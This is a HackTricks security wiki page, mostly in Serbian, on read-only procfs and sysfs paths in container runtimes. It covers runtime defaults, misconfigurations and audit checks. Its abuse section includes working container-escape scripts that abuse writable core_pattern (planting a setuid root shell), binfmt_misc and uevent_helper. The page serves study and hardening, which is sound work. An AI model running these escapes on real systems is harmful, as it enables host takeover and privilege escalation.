# Sistemske putanje samo za čitanje

{{#include ../../../../banners/hacktricks-training.md}}

Sistemske putanje samo za čitanje predstavljaju zasebnu zaštitu u odnosu na maskirane putanje. Umesto da runtime u potpunosti sakrije putanju, on je izlaže ali je montira samo za čitanje. Ovo je uobičajeno za odabrane procfs i sysfs lokacije gde je pristup za čitanje prihvatljiv ili operativno neophodan, ali upis bi bio previše opasan.

Svrha je jednostavna: mnogi kernel interfejsi postaju znatno opasniji kada su zapisivi. Montiranje samo za čitanje ne uklanja svu vrednost za izviđanje, ali sprečava kompromitovanu aplikaciju da putem te putanje menja fajlove koji su izloženi kernelu.

## Operacija

Runtimes često obeležavaju delove prikaza proc/sys kao samo za čitanje. U zavisnosti od runtime-a i hosta, ovo može uključivati putanje kao što su:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

Stvarna lista varira, ali model je isti: dozvoli vidljivost gde je potrebna, podrazumevano zabraniti izmene.

## Laboratorija

Inspect the Docker-declared read-only path list:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Pregledajte montirani prikaz proc/sys u containeru:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Bezbednosni uticaj

Putanje sistema koje su samo za čitanje sužavaju veliki skup zloupotreba koje utiču na host. Čak i kada napadač može da pregleda procfs ili sysfs, nemogućnost upisa tamo uklanja mnoge direktne puteve za izmene koji se tiču podešavanja kernela, crash handlera, pomoćnih programa za učitavanje modula ili drugih kontrolnih interfejsa. Izloženost nije potpuno uklonjena, ali prelazak od otkrivanja informacija ka uticaju na host postaje teži.

## Pogrešna podešavanja

Glavne greške su uklanjanje maski ili ponovno montiranje osetljivih putanja u režimu čitanja i pisanja, izlaganje host proc/sys sadržaja direktno putem bind mount-ova koji su upisivi, ili korišćenje privilegovanih režima koji praktično zaobilaze bezbednije podrazumevane runtime postavke. U Kubernetes-u, `procMount: Unmasked` i privilegovani workloads često idu zajedno sa slabijom zaštitom proc-a. Još jedna uobičajena operativna greška je pretpostavka da, pošto runtime obično montira ove putanje samo za čitanje, svi workloads i dalje nasleđuju taj podrazumevani režim.

## Zloupotreba

Ako je zaštita slaba, počnite traženjem upisivih unosa u proc/sys:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Ako postoje writable unosi, sledeći važni putevi za dalju istragu uključuju:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
What these commands can reveal:

- Writable entries under `/proc/sys` often mean the container can modify host kernel behavior rather than merely inspect it.
- `core_pattern` is especially important because a writable host-facing value can be turned into a host code-execution path by crashing a process after setting a pipe handler.
- `modprobe` reveals the helper used by the kernel for module-loading related flows; it is a classic high-value target when writable.
- `binfmt_misc` tells you whether custom interpreter registration is possible. If registration is writable, this can become an execution primitive instead of just an information leak.
- `panic_on_oom` controls a host-wide kernel decision and can therefore turn resource exhaustion into host denial of service.
- `uevent_helper` is one of the clearest examples of a writable sysfs helper path producing host-context execution.

Interesting findings include writable host-facing proc knobs or sysfs entries that should normally have been read-only. At that point, the workload has moved from a constrained container view toward meaningful kernel influence.

### Full Example: `core_pattern` Host Escape

If `/proc/sys/kernel/core_pattern` is writable from inside the container and points to the host kernel view, it can be abused to execute a payload after a crash:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Ako putanja zaista dopre do kernela hosta, payload se izvršava na hostu i ostavlja setuid shell.

### Kompletan primer: registracija `binfmt_misc`

Ako je `/proc/sys/fs/binfmt_misc/register` upisiv, registracija prilagođenog interpretera može dovesti do izvršavanja koda kada se pokrene odgovarajuća datoteka:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Ako je `binfmt_misc` izložen hostu i upisiv, to može dovesti do izvršavanja koda u putanji interpretera koju pokreće kernel.

### Potpun primer: `uevent_helper`

Ako je `/sys/kernel/uevent_helper` upisiv, kernel može pozvati helper na putanji hosta kada se pokrene odgovarajući događaj:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Razlog zbog kojeg je ovo toliko opasno je taj što se helper path rešava iz perspektive host filesystem-a, umesto iz bezbednog container-only konteksta.

## Provere

Ove provere utvrđuju da li je procfs/sysfs izloženost samo za čitanje tamo gde se očekuje i da li workload i dalje može da menja osetljive kernel interfejse.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Šta je interesantno ovde:

- Normalan hardenovan workload treba da izlaže vrlo malo upisivih unosa u `/proc/sys`.
- Upisivi `/proc/sys` putevi su često važniji od običnog pristupa za čitanje.
- Ako runtime navodi da je putanja samo za čitanje, a u praksi je upisiva, pažljivo proverite mount propagation, bind mounts i podešavanja privilegija.

## Podrazumevana ponašanja runtime-a

| Runtime / platform | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje |
| --- | --- | --- | --- |
| Docker Engine | Podrazumevano omogućeno | Docker definiše podrazumevanu listu putanja samo za čitanje za osetljive proc unose | izlaganje host `proc/sys` mount-ova, `--privileged` |
| Podman | Podrazumevano omogućeno | Podman primenjuje podrazumevane putanje samo za čitanje osim ako se eksplicitno ne opuste | `--security-opt unmask=ALL`, široki host mount-ovi, `--privileged` |
| Kubernetes | Nasleđuje podrazumevana runtime-a | Koristi model podrazumevanih putanja samo za čitanje iz osnovnog runtime-a osim ako se ne oslabi postavkama Poda ili host mount-ovima | `procMount: Unmasked`, privilegovani workload-i, upisivi host `proc/sys` mount-ovi |
| containerd / CRI-O under Kubernetes | Podrazumevano runtime ponašanje | Obično se oslanja na OCI/runtime podrazumevana | isto što i red za Kubernetes; direktne promene runtime konfiguracije mogu oslabiti ponašanje |

Ključna poenta je da su sistemske putanje samo za čitanje obično prisutne kao podrazumevane runtime opcije, ali ih je lako potkopati privilegovanim režimima ili host bind mount-ovima.
